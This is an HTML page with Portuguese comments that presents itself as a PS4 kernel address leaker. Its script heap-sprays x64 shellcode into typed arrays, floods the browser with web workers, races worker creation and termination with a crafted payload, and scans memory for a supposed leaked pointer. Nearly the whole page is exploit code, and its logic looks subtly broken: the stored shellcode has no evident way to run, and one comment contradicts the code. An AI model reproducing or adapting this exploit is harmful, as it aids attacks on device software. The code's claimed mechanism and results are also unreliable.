<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>PS4 KERNEL LEAKER (ULTRA LIGHT)</title>
    <style>
        body { background-color: #000; color: #aaa; font-family: monospace; text-align: center; padding: 20px; }
        #status { font-size: 1.5em; border: 1px solid #444; padding: 20px; margin-bottom: 20px; }
        #leak-display { font-size: 2em; color: #fff; background: #005; padding: 15px; display: none; border: 2px solid #00f; }
        .success { color: #0f0 !important; border-color: #0f0 !important; }
        .fail { color: #f00 !important; }
    </style>
</head>
<body>

    <h1>KERNEL LEAKER (LOW RAM)</h1>
    <div id="status">AGUARDANDO INÍCIO...</div>
    <div id="leak-display"></div>

    <script>
        // --- CONFIGURAÇÃO LEVE ---
        const TARGET_THREADS = 417; 
        const SPRAY_SIZE = 512;
        const TARGET_OFFSET = 384; 
        
        // Mantemos 0x40... mas vamos alocar MENOS
        const ADDR_BYTE_3 = 0x40;

        let workers = [];
        let heapSpray = [];
        let scannerInterval = null;
        
        const blob = new Blob(["setInterval(()=>{}, 100000)"], {type:'text/javascript'});
        const url = URL.createObjectURL(blob);
        const killerBlob = new Blob(["self.close()"], {type:'text/javascript'});
        const killerUrl = URL.createObjectURL(killerBlob);

        // SHELLCODE (Assembly x64) - O mesmo que funciona
        const code = new Uint8Array([
            0x48, 0x8B, 0x04, 0x24,       // mov rax, [rsp] (Pega endereço Kernel)
            0x48, 0x8D, 0x3D, 0x08, 0x00, 0x00, 0x00, // lea rdi, [rip+8]
            0x48, 0x89, 0x07,             // mov [rdi], rax (Escreve no array)
            0xC3,                         // ret (Volta)
            0x00, 0x00, 0x00, 0x00,       // Slot Leitura
            0x00, 0x00, 0x00, 0x00        // Slot Leitura
        ]);

        function start() {
            document.getElementById('status').innerText = "1. ALOCANDO (MODO ECONÔMICO)...";
            
            // Pequeno delay para garantir UI renderizada
            setTimeout(() => {
                try {
                    const code32 = new Uint32Array(code.buffer);
                    
                    // REDUZIDO DE 800 PARA 200 ARRAYS
                    // Se falhar (crashar sem leak), aumente para 250. Se der OOM, diminua para 150.
                    for(let i=0; i<200; i++) { 
                        let arr = new Uint32Array(0x4000); 
                        for(let k=0; k < arr.length; k += code32.length) {
                            for(let j=0; j < code32.length; j++) {
                                if (k+j < arr.length) arr[k+j] = code32[j];
                            }
                        }
                        heapSpray.push(arr);
                    }
                    
                    document.getElementById('status').innerText = "2. SUBINDO THREADS...";
                    startThreads();
                    
                } catch(e) {
                    document.getElementById('status').innerText = "OOM: MEMÓRIA CHEIA. REINICIE O CONSOLE.";
                    document.getElementById('status').className = "fail";
                }
            }, 500);
        }

        function startThreads() {
            let i = setInterval(() => {
                if (workers.length < TARGET_THREADS) {
                    workers.push(new Worker(url));
                    // Atualiza a tela menos vezes para economizar recursos
                    if(workers.length % 100 === 0) {
                         document.getElementById('status').innerText = `WORKERS: ${workers.length}...`;
                    }
                } else {
                    clearInterval(i);
                    document.getElementById('status').innerText = "3. SCANNER ATIVO (4s)...";
                    
                    // Inicia scanner LEVE (intervalo maior)
                    scannerInterval = setInterval(scanMemory, 500);
                    
                    setTimeout(attack, 4000);
                }
            }, 30);
        }

        function attack() {
            if(document.getElementById('status').classList.contains('success')) return;
            
            const st = document.getElementById('status');
            st.innerText = ">>> TENTANDO LEAK... <<<";
            
            const payload = new Uint8Array(SPRAY_SIZE);
            payload.fill(0x00); 
            payload[TARGET_OFFSET] = 0x00;
            payload[TARGET_OFFSET+1] = 0x00;
            payload[TARGET_OFFSET+2] = 0x00;
            payload[TARGET_OFFSET+3] = ADDR_BYTE_3;

            // Metralhadora mais lenta para dar tempo da CPU respirar
            setInterval(() => {
                const w = new Worker(killerUrl);
                w.terminate();
                try {
                    if(workers.length > 0) workers[0].postMessage(payload);
                } catch(e){}
            }, 20); // Aumentei para 20ms
        }

        function scanMemory() {
            // Scanner otimizado: Olha apenas 1 a cada 5 arrays
            for(let i=0; i<heapSpray.length; i+=2) { 
                const arr = heapSpray[i];
                // Olha apenas o começo do array
                for(let k=4; k<32; k+=8) { 
                   if (arr[k] != 0 && arr[k] != 0xC3078948) { 
                       // Check simples de ponteiro alto
                       if (arr[k+1] != 0) { 
                           foundLeak(arr[k], arr[k+1]);
                           return;
                       }
                   }
                }
            }
        }

        function foundLeak(low, high) {
            clearInterval(scannerInterval);
            const hLow = (low >>> 0).toString(16).padStart(8, '0');
            const hHigh = (high >>> 0).toString(16).padStart(8, '0');
            
            // Formata bonitinho
            const fullAddr = `0x${hHigh}${hLow}`;
            
            const st = document.getElementById('status');
            st.innerText = "SUCESSO! ENDEREÇO CAPTURADO:";
            st.className = "success";
            
            const disp = document.getElementById('leak-display');
            disp.style.display = "block";
            disp.innerText = fullAddr;

            // Mata tudo para liberar RAM e evitar crash pós-sucesso
            workers.forEach(w => w.terminate());
            workers = [];
            heapSpray = []; 
        }

        // Início com delay maior
        setTimeout(start, 2000);

    </script>
</body>
</html>
